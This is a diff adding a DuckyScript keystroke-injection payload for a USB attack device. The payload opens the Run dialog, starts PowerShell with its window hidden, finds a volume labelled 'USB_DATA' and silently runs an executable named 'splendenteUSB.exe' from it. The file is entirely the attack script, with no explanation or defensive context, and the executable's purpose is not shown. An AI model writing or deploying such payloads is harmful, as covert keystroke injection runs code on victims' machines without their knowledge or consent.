@@ -1,0 +1,44 @@
+DELAY 4000
+GUI r
+
+DELAY 1000
+STRING powershell -WindowStyle hidden
+
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $letter = Get-Volume -FileSystemLabel "USB_DATA"
+
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $letter = $letter.DriveLetter
+
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $strings = ":\"
+
+DELAY 500
+ENTER
+
+DELAY 500
+STRING Set-Location "$letter$strings"
+
+DELAY 500
+ENTER
+
+DELAY 500
+STRING cd splendente
+
+DELAY 500
+ENTER
+
+DELAY 500
+STRING .\splendenteUSB.exe
+
+DELAY 500
+ENTER
